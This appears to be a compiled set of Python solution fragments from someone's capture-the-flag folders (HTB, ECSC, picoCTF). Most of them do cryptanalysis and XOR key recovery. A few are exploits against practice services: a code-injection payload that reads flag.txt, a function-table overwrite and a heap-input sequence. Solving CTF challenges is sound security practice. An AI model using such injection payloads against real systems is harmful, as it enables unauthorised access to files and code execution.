        self.v3 = 14943875659428467087081841480998474044007665197104764079769879270204055794811591927815227928936527971132575961879124968229204795457570030
        self.v4 = 6336816260107995932250378492551290960420748628

        # /home/figaro/CTF/Categories/Cryptography/HTB/sugar_free_candies/payloads/solution.py
    def solve_equations(self):
        self.cnd1, self.cnd2, self.cnd3 = symbols(&#34;cnd1 cnd2 cnd3&#34;)

        # Define the equations
        eq1 = Eq(self.cnd1**3 + self.cnd3**2 + self.cnd2, self.v1)
        eq2 = Eq(self.cnd2**3 + self.cnd1**2 + self.cnd3, self.v2)
        eq3 = Eq(self.cnd3**3 + self.cnd2**2 + self.cnd1, self.v3)
        eq4 = Eq(self.cnd1 + self.cnd2 + self.cnd3, self.v4)

        solution = solve((eq1, eq2, eq3, eq4), (self.cnd1, self.cnd2, self.cnd3))
        return solution

        # /home/figaro/CTF/Categories/Cryptography/HTB/sugar_free_candies/payloads/solution.py
    def main(self):
        solution = self.solve_equations()

        # Check if the solution is valid
        if isinstance(solution, list) and len(solution) &gt; 0:
            # Assuming the first solution is the desired one
            sol = solution[0]
            print(&#34;cnd1:&#34;, sol[self.cnd1])
            print(&#34;cnd2:&#34;, sol[self.cnd2])
            print(&#34;cnd3:&#34;, sol[self.cnd3])

        # /home/figaro/CTF/Categories/Cryptography/HTB/sekur_julius/payloads/solution.py
    def juilius_decrypt(self, msg, shift):
        pt = &#34;&#34;
        for c in msg:
            if c == &#34;0&#34;:
                pt += &#34; &#34;
            elif not ord(&#34;A&#34;) &lt;= ord(c) &lt;= ord(&#34;Z&#34;):
                pt += c
            else:
                o = ord(c) - 65
                pt += chr(65 + (o - shift) % 26)
        return pt

        # /home/figaro/CTF/Categories/Cryptography/HTB/sekur_julius/payloads/solution.py
    def brute_force(self, encrypted_data):

        for shift in range(27):
            pt = self.juilius_decrypt(encrypted_data, shift)
            if &#34;HTB&#34; in pt:
                return pt

        # /home/figaro/CTF/Categories/Cryptography/HTB/sekur_julius/payloads/solution.py
    def main(self):
        with open(self.challenge_file, &#34;r&#34;) as f:
            encrypted_data = f.read().strip()

        decrypted_data = self.brute_force(encrypted_data)
        print(decrypted_data)

        # /home/figaro/CTF/Categories/Cryptography/ECSC/Asteromata/payloads/solution.py
    def get_output_variables(self):
        with open(self.challenge_file, &#34;r&#34;) as f:
            self.variables = {
                line.split(&#34; = &#34;)[0]: int(line.strip(&#34;\n&#34;).split(&#34; = &#34;)[1])
                for line in f
            }

        # /home/figaro/CTF/Categories/Cryptography/ECSC/Asteromata/payloads/solution.py
    def main(self):
        self.get_output_variables()
        rx = re.compile(r&#34;(\w+)\s*=\s*(\d+)&#34;)

        ct = self.variables[&#34;ct&#34;]
        hint = self.variables[&#34;hint&#34;]
        n = self.variables[&#34;n&#34;]
        e = self.variables[&#34;e&#34;]

        P = symbols(&#34;P&#34;)
        phi_expr = lambda p: n + 1 - p - n // p  # symbolic (n)  (works in Z)
        start = 103000
        message = &#34;&#34;
        for k in range(start, e):
            print(f&#34;I - {k} | m: {message}&#34;)

            # build F_k(p) with the trick explained above
            Y = k * (n + 1 - P) + 1  # k(n+1-p) + 1   (first part)
            Fk = (
                (Y - k * n / P) ** 2 * P**4
                - hint * e * e * P**3
                + (k * k * n * n + e**4 * n) * P**2
            )
            poly = Poly(Fk.expand() * P**0, P)  # canonical form, ZZ [x]

            # try to pull out linear factors
            for factor, _ in poly.factor_list()[1]:
                if factor.degree() != 1:  # need a root of degree-1
                    message = &#34;prev continued&#34;
                    continue
                root = -factor.all_coeffs()[-1] // factor.all_coeffs()[0]

                if root &gt; 1 and n % root == 0:  # bingo  we have   p
                    p = int(root)
                    q = n // p
                    phi = (p - 1) * (q - 1)
                    d = gmpy2.invert(e, phi)  # private exponent
                    m = pow(ct, d, n)
                    flag = gmpy2.to_binary(m).rstrip(b&#34;\x00&#34;)
                    print(f&#34;[+] k   = {k}&#34;)
                    print(f&#34;[+] p   = {p}&#34;)
                    print(f&#34;[+] q   = {q}&#34;)
                    print(f&#34;[+] d   = {d}&#34;)
                    print(f&#34;[+] flag = {flag.decode(errors=&#39;ignore&#39;)}&#34;)
                    sys.exit(0)
                message = &#34;&#34;

        # /home/figaro/CTF/Categories/Cryptography/ECSC/Asteromata/payloads/attempt_01.py
    def get_output_variables(self):
        with open(self.challenge_file, &#34;r&#34;) as f:
            self.variables = {
                line.split(&#34; = &#34;)[0]: int(line.strip(&#34;\n&#34;).split(&#34; = &#34;)[1])
                for line in f
            }

        # /home/figaro/CTF/Categories/Cryptography/ECSC/Asteromata/payloads/attempt_01.py
    def main(self):
        self.get_output_variables()
        # self.variables
        # Let p be unknown. Use:
        # hint = d^2 * p + e^2 * q
        # n = p * q  q = n // p
        # Substitute and solve: hint = d^2 * p + e^2 * (n // p)
        # This turns into: hint = A*p + B*(n//p)

        # We can brute force small `e` (22 bits), so d is not that large.
        ct = self.variables[&#34;ct&#34;]
        hint = self.variables[&#34;hint&#34;]
        n = self.variables[&#34;n&#34;]
        e = self.variables[&#34;e&#34;]

        found = False
        for possible_d in range(1, 1 &lt;&lt; 22):
            A = possible_d**2
            B = e**2
            numerator = hint - B * n
            denominator = A - B

            if denominator == 0:
                continue

            if numerator % denominator != 0:
                continue

            p_candidate = numerator // denominator
            if n % p_candidate != 0:
                continue

            q_candidate = n // p_candidate

            if isPrime(p_candidate) and isPrime(q_candidate):
                p = p_candidate
                q = q_candidate
                d = possible_d
                found = True
                print(f&#34;[+] Found p and q using d = {d}&#34;)
                break

        if not found:
            print(&#34;[-] Failed to find valid p and q&#34;)
            return  # or: raise Exception(&#34;Failed to find primes&#34;)

        # Continue only if found
        phi = (p - 1) * (q - 1)
        d = inverse(e, phi)

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def des_key_generator(self):
        &#34;&#34;&#34;
        Generator for all possible 8-byte DES keys.
        DES uses a 56-bit key space, padded to 8 bytes.
        &#34;&#34;&#34;
        for key in range(2**64):
            # Convert the 56-bit key to an 8-byte key
            key_bytes = key.to_bytes(8, byteorder=&#34;big&#34;)
            yield key_bytes

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def oracle_encrypt(self, pt_hex):
        self.recv_send(text=&#34;1&#34;, text_until=&#34;&gt; &#34;)
        self.recv_send(
            text=pt_hex,
            text_until=&#34;Provide message to encrypt &gt; &#34;,
        )
        encrypted_pt = self.recv_lines(1, save=True)[0]
        return bytes.fromhex(encrypted_pt.strip().decode())

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def menu_handler(self, verbose=False):
        for pt in self.plaintexts:
            ct = self.oracle_encrypt(pt.hex())
            if verbose:
                print(f&#34;Encrypting plaintext: {pt.hex()} - ciphertext: {ct.hex()}&#34;)
            self.pairs.append((pt, ct))

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def try_key(self, key_bytes):
        key = des.DesKey(key_bytes)
        for pt, ct in self.pairs:
            if key.encrypt(pt) != ct:
                return False
        return True

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def bruteforce_key(self, verbose=False):
        found_key = None
        for key_canditate in itertools.product(range(256), repeat=8):
            if verbose:
                print(f&#34;Trying key: {bytes(key_canditate).hex()}&#34;)
            key_bytes = bytes(key_canditate)
            if self.try_key(key_bytes):
                found_key = key_bytes
                print(&#34;Key found:&#34;, found_key.hex())
                break
        return found_key

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def bruteforce_key_multiprocessing(self, verbose=False):
        &#34;&#34;&#34;
        Multiprocessing brute-force key search.
        &#34;&#34;&#34;
        found_key = None

        with Pool(processes=cpu_count() - 8) as pool:
            key_candidates = itertools.product(range(256), repeat=8)
            # Pass both key candidates and pairs to the worker
            args = ((key_candidate, self.pairs) for key_candidate in key_candidates)
            for result in pool.imap(worker, args):
                if result:
                    found_key = result
                    print(&#34;Key found:&#34;, found_key.hex())
                    pool.terminate()  # Stop other processes
                    break

        return found_key

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def main(self):

        # 50 unique 8-byte blocks
        self.plaintexts = [bytes([i]) * 8 for i in range(49)]
        self.pairs = []

        self.initiate_connection()
        self.recv_lines(3)

        self.menu_handler(verbose=True)

        found_key = self.bruteforce_key_multiprocessing(verbose=True)
        if not found_key:
            print(&#34;Key not found. Try optimizing or using more pairs.&#34;)
            return

        # Encrypt the magic phrase
        magic_pt = b&#34;Give me the flag&#34;
        key = des.DesKey(found_key)
        magic_ct = key.encrypt(magic_pt)
        print(&#34;Magic ciphertext:&#34;, magic_ct.hex())

        self.recv_send(text=&#34;2&#34;, text_until=&#34;&gt; &#34;)
        self.recv_send(text=magic_ct.hex(), text_until=&#34;Provide the magic phrase &gt; &#34;)
        flag = self.recv_lines(3, display=True, save=True)[0]

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def des_key_generator(self):
        &#34;&#34;&#34;
        Generator for all possible 8-byte DES keys.
        DES uses a 56-bit key space, padded to 8 bytes.
        &#34;&#34;&#34;
        for key in range(2**64):
            # Convert the 56-bit key to an 8-byte key
            key_bytes = key.to_bytes(8, byteorder=&#34;big&#34;)
            yield key_bytes

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def oracle_encrypt(self, pt_hex):
        self.recv_send(text=&#34;1&#34;, text_until=&#34;&gt; &#34;)
        self.recv_send(
            text=pt_hex,
            text_until=&#34;Provide message to encrypt &gt; &#34;,
        )
        encrypted_pt = self.recv_lines(1, save=True)[0]
        return bytes.fromhex(encrypted_pt.strip().decode())

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def menu_handler(self, verbose=False):
        for pt in self.plaintexts:
            ct = self.oracle_encrypt(pt.hex())
            if verbose:
                print(f&#34;Encrypting plaintext: {pt.hex()} - ciphertext: {ct.hex()}&#34;)
            self.pairs.append((pt, ct))

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def try_key(self, key_bytes):
        key = des.DesKey(key_bytes)
        for pt, ct in self.pairs:
            if key.encrypt(pt) != ct:
                return False
        return True

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def bruteforce_key(self, verbose=False):
        found_key = None
        for key_canditate in itertools.product(range(256), repeat=8):
            if verbose:
                print(f&#34;Trying key: {bytes(key_canditate).hex()}&#34;)
            key_bytes = bytes(key_canditate)
            if self.try_key(key_bytes):
                found_key = key_bytes
                print(&#34;Key found:&#34;, found_key.hex())
                break
        return found_key

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def bruteforce_key_multiprocessing(self, verbose=False):
        &#34;&#34;&#34;
        Multiprocessing brute-force key search.
        &#34;&#34;&#34;
        found_key = None

        with Pool(processes=cpu_count() - 8) as pool:
            key_candidates = itertools.product(range(256), repeat=8)
            # Pass both key candidates and pairs to the worker
            args = ((key_candidate, self.pairs) for key_candidate in key_candidates)
            for result in pool.imap(worker, args):
                if result:
                    found_key = result
                    print(&#34;Key found:&#34;, found_key.hex())
                    pool.terminate()  # Stop other processes
                    break

        return found_key

        # /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def main_multi_process(self):

        # 50 unique 8-byte blocks
        self.plaintexts = [bytes([i]) * 8 for i in range(49)]
        self.pairs = []

        self.initiate_connection()
        self.recv_lines(3)

        self.menu_handler(verbose=True)

        found_key = None
        # Needs the logic here

        # Encrypt the magic phrase
        magic_pt = b&#34;Give me the flag&#34;
        key = des.DesKey(found_key)
        magic_ct = key.encrypt(magic_pt)
        print(&#34;Magic ciphertext:&#34;, magic_ct.hex())

        self.recv_send(text=&#34;2&#34;, text_until=&#34;&gt; &#34;)
        self.recv_send(text=magic_ct.hex(), text_until=&#34;Provide the magic phrase &gt; &#34;)
        flag = self.recv_lines(3, display=True, save=True)[0]

        # /home/figaro/CTF/Categories/Cryptography/ECSC/Gamble_Auction/payloads/solution.py
    def main(self):
        pass

        # /home/figaro/CTF/Categories/Cryptography/ECSC/The_Truth/payloads/solution.py
    def main(self):

        with open(self.challenge_file, &#34;r&#34;) as f:
            data = f.read()

        # alphabet = ascii_lowercase + ascii_uppercase + digits

        crypted_alphabet = set()
        for c in data:
            crypted_alphabet.add(c)

        crypted_dict = {c: &#34;&#34; for c in sorted(list(crypted_alphabet))}

        # self.saving_to_json(crypted_dict)

        crypted_dict = self.read_json(&#34;table.json&#34;)

        for i, v in enumerate(crypted_dict):
            print(i + 2, v, crypted_dict[v])

        print(self.decoding(crypted_dict, data))

        # /home/figaro/CTF/Categories/Cryptography/ECSC/The_Truth/payloads/solution.py
    def decoding(self, crypted_dict, data):

        decoded = &#34;&#34;
        for c in data:
            if c in crypted_dict.keys() and crypted_dict[c] != &#34;&#34;:
                decoded += crypted_dict[c]
            else:
                decoded += c
        return decoded

        # /home/figaro/CTF/Categories/Cryptography/ECSC/The_Truth/payloads/solution.py
    def saving_to_json(self, crypted_dict):

        self.folfil(&#34;data&#34;, &#34;table.json&#34;)

        with open(self.folfil(&#34;data&#34;, &#34;table.json&#34;), &#34;w&#34;) as f:
            json.dump(crypted_dict, f, indent=4)

        # /home/figaro/CTF/Categories/Cryptography/ECSC/The_Truth/payloads/solution.py
    def read_json(self, filename):
        with open(self.folfil(&#34;data&#34;, filename), &#34;r&#34;) as f:
            return json.load(f)

        # /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Classic_Crackme_0x100/payloads/solution.py
    def main(self):
        pass

        # /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_1/payloads/solution.py
    def de_hexing_flag(self, flag):
        flag = flag[0].decode(&#34;utf-8&#34;).strip(&#34;\n&#34;).strip(&#34; &#34;)
        flag = [chr(int(letter, 16)) for letter in flag.split(&#34; &#34;)]
        flag = &#34;&#34;.join(flag)
        return flag

        # /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_1/payloads/solution.py
    def main(self):
        self.initiate_connection()
        self.menu_num = 1
        self.menu_text = &#34;==&gt; &#34;
        self.send_menu(choice=&#34;win&#34;, display=False)
        flag = self.recv_menu(number=1, display=False, save=True)

        flag = self.de_hexing_flag(flag)
        print(flag)

        # /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_2/payloads/solution.py
    def main(self):
        payload = &#34;print(open(&#39;flag.txt&#39;,&#39;r&#39;).read())#&#34;
        self.initiate_connection()
        self.menu_num = 0
        self.menu_text = &#34;==&gt; &#34;
        self.send_menu(choice=payload, display=True)
        flag = self.recv_menu(number=1, display=True, save=True)[0]
        print(flag)

        # /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_3/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.menu_num = 0
        self.menu_text = &#34;==&gt; &#34;
        self.local_preparations()
        self.initiate_connection()
        self.help_num = 13

        # /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_3/payloads/solution.py
    def local_preparations(self):
        if self.conn == &#34;remote&#34;:
            return
        self.challenge_file = self.Path(self.parent, &#34;challenge&#34;, self.file)
        self.folder_challenge = self.Path(self.parent, &#34;challenge&#34;)
        self.prepare_space(
            files=[&#34;flag.txt&#34;],
            folder=self.folder_challenge,
        )

        # /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_3/payloads/solution.py
    def de_hexing_flag(self, flag):
        flag = flag[0].decode(&#34;utf-8&#34;).strip(&#34;\n&#34;).strip(&#34; &#34;)
        flag = [chr(int(letter, 16)) for letter in flag.split(&#34; &#34;)]
        flag = &#34;&#34;.join(flag)
        return flag

        # /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_3/payloads/solution.py
    def main(self):

        # This was useless to get the func tables and stuff

        # self.send_menu(choice=2)
        # self.conn.recvuntil(&#34;Please enter variable name to read: &#34;.encode())
        # self.conn.sendline(&#34;FUNC_TABLE_SIZE&#34;.encode())
        # FUNC_TABLE_SIZE = self.recv_menu(number=1, display=True, save=True)[0]

        # self.send_menu(choice=2)
        # self.conn.recvuntil(&#34;Please enter variable name to read: &#34;.encode())
        # self.conn.sendline(&#34;FUNC_TABLE_ENTRY_SIZE&#34;.encode())
        # FUNC_TABLE_ENTRY_SIZE = self.recv_menu(number=1, display=True, save=True)[0]

        # FUNC_TABLE_SIZE = int(FUNC_TABLE_SIZE.decode(&#34;utf-8&#34;).strip(&#34;\n&#34;).strip(&#34; &#34;))
        # FUNC_TABLE_ENTRY_SIZE = int(
        #     FUNC_TABLE_ENTRY_SIZE.decode(&#34;utf-8&#34;).strip(&#34;\n&#34;).strip(&#34; &#34;)
        # )

        new_func_table = &#39;&#34;{0:128}&#34;&#39;.format(&#34;win&#34;)
        self.send_menu(choice=3)

        self.conn.recvuntil(&#34;Please enter variable name to write: &#34;.encode())
        self.conn.sendline(&#34;func_table&#34;.encode())

        self.conn.recvuntil(&#34;Please enter new value of variable: &#34;.encode())
        self.conn.sendline(new_func_table.encode())

        # Access the first option of the table
        self.send_menu(choice=1)

        flag = self.recv_menu(number=1, display=True, save=True)
        flag = self.de_hexing_flag(flag)
        print(flag)

        self.conn.sendline(&#34;quit&#34;.encode())

        # /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/keygenme-py/payloads/solution.py
    def main(self):

        username_trial = &#34;PRITCHARD&#34;
        bUsername_trial = b&#34;PRITCHARD&#34;

        key_part_static1_trial = &#34;picoCTF{1n_7h3_|&lt;3y_of_&#34;
        key_part_dynamic1_trial = &#34;xxxxxxxx&#34;
        key_part_static2_trial = &#34;}&#34;

        # I used bUsername_trial because enter_liscence used it as well but after testing afterwards, they output the same answer
        middle_flag = [
            hashlib.sha256(bUsername_trial).hexdigest()[4],
            hashlib.sha256(bUsername_trial).hexdigest()[5],
            hashlib.sha256(bUsername_trial).hexdigest()[3],
            hashlib.sha256(bUsername_trial).hexdigest()[6],
            hashlib.sha256(bUsername_trial).hexdigest()[2],
            hashlib.sha256(bUsername_trial).hexdigest()[7],
            hashlib.sha256(bUsername_trial).hexdigest()[1],
            hashlib.sha256(bUsername_trial).hexdigest()[8],
        ]

        key_part_dynamic1_trial = &#34;&#34;.join(middle_flag)
        key_full_template_trial = (
            key_part_static1_trial + key_part_dynamic1_trial + key_part_static2_trial
        )

        print(key_full_template_trial)

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def bytes_to_int_array(self, data):
        &#34;&#34;&#34;Convert bytes to array of integers&#34;&#34;&#34;
        return [b for b in data]

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def int_array_to_bytes(self, data):
        &#34;&#34;&#34;Convert array of integers to bytes&#34;&#34;&#34;
        return bytes(data)

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def xor_decrypt(self, encrypted, key):
        &#34;&#34;&#34;Perform XOR decryption similar to FUN_00101189&#34;&#34;&#34;
        if not key:
            return b&#34;&#34;

        result = []
        key_len = len(key)

        for i in range(len(encrypted)):
            result.append(encrypted[i] ^ key[i % key_len])

        return bytes(result)

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def hex_to_bytes_le(self, hex_val, size):
        return hex_val.to_bytes(size, &#34;little&#34;)

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def solve_challenge(self):
        &#34;&#34;&#34;Main function to solve the challenge&#34;&#34;&#34;

        # Extract the encrypted data from the decompiled code (little-endian format)
        # Convert hex values to bytes in little-endian order

        # Stage 1 data from local_258, local_250, local_248, local_240, local_238
        encrypted_stage1 = (
            self.hex_to_bytes_le(0x59E9BA9E8F463D01, 8)
            + self.hex_to_bytes_le(0x5B94C9EA56CFFF4F, 8)
            + self.hex_to_bytes_le(0xC1129B387F683E5, 8)
            + self.hex_to_bytes_le(0xC19D94E581D7E07A, 8)
            + self.hex_to_bytes_le(0x2D2E57E4, 4)
        )

        # Stage 2 data from local_228, local_220, local_218, local_210, local_208
        encrypted_stage2 = (
            self.hex_to_bytes_le(0x4E9EF0D5EA375C64, 8)
            + self.hex_to_bytes_le(0x48E7DEA62BDB901D, 8)
            + self.hex_to_bytes_le(0x5A4654DEE5B1D698, 8)
            + self.hex_to_bytes_le(0x8D8E95F2979D8315, 8)
            + self.hex_to_bytes_le(0x703F1481, 4)
        )

        print(&#34;[*] Attempting to recover the key...&#34;)
        print(f&#34;[*] Stage 1 encrypted data length: {len(encrypted_stage1)}&#34;)
        print(f&#34;[*] Stage 2 encrypted data length: {len(encrypted_stage2)}&#34;)

        # Try common flag prefixes (focusing on ECSC format)
        common_prefixes = [b&#34;ECSC{&#34;, b&#34;ecsc{&#34;]

        for prefix in common_prefixes:
            print(f&#34;\n[*] Trying prefix: {prefix.decode()}&#34;)

            # Try different key lengths (minimum 5 as per the code)
            for key_length in range(5, 21):
                print(f&#34;[*] Trying key length: {key_length}&#34;)

                # Try to find a key that produces the expected prefix
                # We&#39;ll try a brute force approach for short keys
                if key_length &lt;= 8:
                    # For short keys, try common patterns
                    test_keys = [
                        b&#34;hello&#34; + b&#34;a&#34; * (key_length - 5),
                        b&#34;password&#34;[:key_length],
                        b&#34;12345&#34; + b&#34;a&#34; * (key_length - 5),
                        b&#34;admin&#34; + b&#34;a&#34; * (key_length - 5),
                        b&#34;key12&#34; + b&#34;a&#34; * (key_length - 5),
                        b&#34;test1&#34; + b&#34;a&#34; * (key_length - 5),
                    ]

                    for test_key in test_keys:
                        if len(test_key) != key_length:
                            continue

                        # First decrypt stage 1 with the test key
                        stage1_result = self.xor_decrypt(encrypted_stage1, test_key)

                        # Then decrypt stage 2 with stage 1 result
                        final_result = self.xor_decrypt(encrypted_stage2, stage1_result)

                        # Check if result starts with expected prefix
                        if final_result.startswith(prefix):
                            print(f&#34;[+] FOUND POTENTIAL KEY: {test_key}&#34;)
                            print(f&#34;[+] Decrypted flag: {final_result}&#34;)
                            return test_key, final_result

        # If simple brute force doesn&#39;t work, try reverse engineering approach
        print(&#34;\n[*] Simple brute force failed. Trying reverse engineering approach...&#34;)

        # Assume the flag starts with &#34;ECSC{&#34; and try to work backwards
        target_prefix = b&#34;ECSC{&#34;

        # Try to find what stage1_result should be to produce target_prefix
        for key_len in range(5, 16):
            print(f&#34;[*] Reverse engineering with key length: {key_len}&#34;)

            # Calculate what the stage1 result should start with
            stage1_prefix = []
            for i in range(min(len(target_prefix), len(encrypted_stage2))):
                stage1_prefix.append(encrypted_stage2[i] ^ target_prefix[i])

            stage1_prefix_bytes = bytes(stage1_prefix)
            print(f&#34;[*] Stage1 result should start with: {stage1_prefix_bytes.hex()}&#34;)

            # Now try to find what key produces this stage1_prefix
            key_candidate = []

            for i in range(min(len(stage1_prefix_bytes), len(encrypted_stage1))):
                key_byte = encrypted_stage1[i] ^ stage1_prefix_bytes[i]
                key_candidate.append(key_byte)

            if len(key_candidate) &gt;= 5:
                # Extend key to full length by repeating pattern
                full_key = (key_candidate * ((key_len // len(key_candidate)) + 1))[
                    :key_len
                ]
                test_key = bytes(full_key)

                print(f&#34;[*] Testing key candidate: {test_key}&#34;)

                # Test this key
                stage1_result = self.xor_decrypt(encrypted_stage1, test_key)
                final_result = self.xor_decrypt(encrypted_stage2, stage1_result)

                print(f&#34;[*] Result: {final_result}&#34;)

                # Check if it looks like a valid flag
                if b&#34;ECSC{&#34; in final_result or b&#34;ecsc{&#34; in final_result:
                    print(f&#34;[+] FOUND KEY: {test_key}&#34;)
                    print(f&#34;[+] FLAG: {final_result}&#34;)
                    return test_key, final_result

        print(&#34;[-] Could not find the key automatically&#34;)
        return None, None

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def main(self):
        print(&#34;=&#34; * 60)
        print(&#34;Key Recovery Script for &#39;Just a Key&#39; Challenge - ECSC Format&#34;)
        print(&#34;=&#34; * 60)
        key, flag = self.solve_challenge()

        if key:
            print(f&#34;\n[SUCCESS] Key found: {key}&#34;)
            print(f&#34;[SUCCESS] Flag: {flag}&#34;)
        else:
            print(&#34;\n[FAILED] Could not automatically recover the key&#34;)
            print(
                &#34;You may need to analyze the binary further or try manual key recovery&#34;
            )

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def xor_decrypt(self, key_bytes: bytes, input_bytes: bytes) -&gt; bytes:
        key_len = len(input_bytes)
        result = bytearray(key_len)
        for i in range(key_len):
            result[i] = input_bytes[i % len(input_bytes)] ^ key_bytes[i]
        return result

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def mutate_key(self, buf: bytearray, key: bytes) -&gt; bytearray:
        tmp = buf[:]
        for i in range(0, len(key), 5):
            chunk = key[i : i + 5]
            tmp = self.xor_decrypt(tmp, chunk)
        return tmp

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def try_key(self, candidate: str):
        key = candidate.encode()
        if len(key) &lt; 5:
            return None

        # Transform key_step1 using input
        transformed_key = self.mutate_key(self.key_step1, key)
        # First decryption stage
        intermediate = self.xor_decrypt(self.encrypted_intermediate, transformed_key)
        # Final decryption
        flag = self.xor_decrypt(self.encrypted_flag, intermediate)
        return flag

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def bruteforcer(self):

        print(&#34;[*] Brute-forcing keys with known prefix:&#34;, self.known_prefix)

        for length in range(5, 30):  # keep short for demonstration
            for suffix in product(self.charset, repeat=length - len(self.known_prefix)):
                candidate_key = self.known_prefix + &#34;&#34;.join(suffix)
                result = self.try_key(candidate_key)
                print(candidate_key, result)
                if (
                    result
                    and result.startswith(self.flag_prefix)
                    and result[-1] == ord(&#34;}&#34;)
                ):
                    print(&#34;[+] Found key:&#34;, candidate_key)
                    print(&#34;[+] Flag:&#34;, result.decode(errors=&#34;ignore&#34;))
                    return

        print(&#34;[-] No valid flag found.&#34;)

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def smarter_bruteforcer(self):
        &#34;&#34;&#34;
        Check the first letter first, and then continue
        &#34;&#34;&#34;
        dummy = &#34;a&#34; * 5  # dummy suffix for length calculation
        for length in range(5, 30):  # keep short for demonstration
            pass

        # /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def main(self):

        step1_key = [
            0x11,
            0x11,
            0x11,
            0x11,
            0x11,
            0x01,
            0x3D,
            0x46,
            0x8F,
            0x9E,
            0xBA,
            0xE9,
            0x59,
            0x4F,
            0xFF,
            0xCF,
            0x56,
            0xEA,
            0xC9,
            0x94,
            0x5B,
            0x05,
            0x3E,
            0x68,
            0x7F,
            0x38,
            0x9B,
            0x12,
            0xC1,
            0x7A,
            0xE0,
            0xD7,
            0x81,
            0xE5,
            0x94,
            0x9D,
            0xC1,
            0xE4,
            0x57,
            0x2E,
            0x2D,
            0x00,
        ]

        self.key_step1 = bytearray.fromhex(
            &#34;11111111&#34;
            &#34;11&#34;
            &#34;00&#34;
            &#34;59e9ba9e8f463d01&#34;
            &#34;5b94c9ea56cfff4f&#34;
            &#34;0c1129b387f683e5&#34;
            &#34;c19d94e581d7e07a&#34;
            &#34;2d2e57e4&#34;
            &#34;00&#34;
        ).ljust(44, b&#34;\x00&#34;)

        # From local_258 onward
        self.encrypted_intermediate = bytearray.fromhex(
            &#34;59e9ba9e8f463d01&#34;
            &#34;5b94c9ea56cfff4f&#34;
            &#34;0c1129b387f683e5&#34;
            &#34;c19d94e581d7e07a&#34;
            &#34;2d2e57e4&#34;
        )

        # From local_228 onward
        self.encrypted_flag = bytearray.fromhex(
            &#34;4e9ef0d5ea375c64&#34;
            &#34;48e7dea62bdb901d&#34;
            &#34;5a4654dee5b1d698&#34;
            &#34;8d8e95f2979d8315&#34;
            &#34;703f1481&#34;
        )

        # Charset for brute-forcing
        self.charset = string.ascii_letters + string.digits + &#34;_{}&#34;
        self.known_prefix = &#34;&#34;
        self.flag_prefix = b&#34;ECSC{&#34;

        self.bruteforcer()

        # /home/figaro/CTF/Categories/Binary/picoCTF/heap_3/payloads/solution.py
    def __init__(self, **kwargs) -&gt; None:
        super().__init__(**kwargs)
        self.prepare_space(
            files=[&#34;flag.txt&#34;], folder=self.folder_files, test_text=&#34;picoCTF{test}&#34;
        )
        # self.elf = self.pwn.ELF(self.challenge_file)
        self.initiate_connection()

        # /home/figaro/CTF/Categories/Binary/picoCTF/heap_3/payloads/solution.py
    def main(self):
        self.menu_num = 8
        self.menu_text = &#34;Enter your choice: &#34;

        # Init
        self.recv_menu(4)

        self.send_menu(&#34;5&#34;)
        self.send_menu(&#34;2&#34;)

        self.conn.recvuntil(b&#34;allocation: &#34;)
        self.conn.sendline(b&#34;31&#34;)
        self.conn.recvuntil(b&#34;Data for flag: &#34;)
        self.conn.sendline(b&#34;A&#34; * 30 + b&#34;pico&#34;)

        self.send_menu(&#34;3&#34;)
        self.recv_menu(4, False)

        self.send_menu(&#34;4&#34;)

        self.recv_menu(2, True)

        # /home/figaro/CTF/Categories/Binary/picoCTF/heap_1/payloads/solution.py
    def __init__(self, **kwargs) -&gt; None:
        super().__init__(**kwargs)
        self.prepare_space(
            files=[&#34;flag.txt&#34;], folder=self.folder_files, test_text=&#34;picoCTF{test}&#34;
        )
        self.current_initiate_connection()

